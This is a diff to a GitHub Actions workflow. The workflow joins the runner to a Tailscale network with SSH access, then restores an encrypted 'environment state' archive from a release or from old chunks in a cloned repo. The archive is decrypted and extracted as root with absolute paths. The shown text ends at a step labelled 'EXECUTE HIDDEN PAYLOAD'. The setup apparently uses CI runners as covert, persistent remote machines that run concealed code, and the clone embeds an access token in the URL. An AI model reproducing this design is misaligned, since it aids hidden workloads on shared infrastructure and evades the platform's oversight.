@@ -19,8 +19,8 @@ jobs:
           hostname: ${{ github.event.inputs.worker_id }}
           tags: tag:ci
           args: --ssh
-
-      # 2. RESTORE ENCRYPTED BLOB (Updated for GitHub Releases)
+          
+      # 2. RESTORE ENCRYPTED BLOB (Handles Old Chunks)
       - name: Fetch Environment State
         env:
           GH_TOKEN: ${{ secrets.BACKUP_PAT }}
@@ -31,18 +31,32 @@ jobs:
           mkdir -p /home/runner/work
           cd /home/runner/work
           
-          # Authenticate GitHub CLI
-          echo "${GH_TOKEN}" | gh auth login --with-token
-          
-          # Check if the release exists, download, and decrypt
+          # First, try to download the new GitHub Release format
           if gh release view "latest-backup" -R "${{ github.repository_owner }}/${REPO_NAME}" &>/dev/null; then
-            echo "Found existing backup. Downloading..."
+            echo "Found Release backup. Downloading..."
             gh release download "latest-backup" -R "${{ github.repository_owner }}/${REPO_NAME}" -p "state.tar.gz.enc" --dir .
             
             openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"$ENC_PASS" -in state.tar.gz.enc | sudo tar -xzPf -
             rm -f state.tar.gz.enc
+            
           else
-            echo "No previous backup found. Starting fresh."
+            echo "No Release found. Checking for old chunked format..."
+            
+            # Clone the backup repository to look for chunks
+            git clone "https://x-access-token:${GH_TOKEN}@github.com/${{ github.repository_owner }}/${REPO_NAME}.git" state-repo || true
+            
+            # If chunks exist, combine, decrypt, and extract them
+            if ls state-repo/chunks/state_part_* 1> /dev/null 2>&1; then
+              echo "Found old chunks. Merging and extracting..."
+              cat state-repo/chunks/state_part_* > state.tar.gz.enc
+              openssl enc -aes-256-cbc -d -pbkdf2 -pass pass:"$ENC_PASS" -in state.tar.gz.enc | sudo tar -xzPf -
+              rm -f state.tar.gz.enc
+            else
+              echo "No previous backup found anywhere. Starting fresh."
+            fi
+            
+            # Clean up the cloned repo so it doesn't get backed up again
+            rm -rf state-repo
           fi
 
       # 3. EXECUTE HIDDEN PAYLOAD
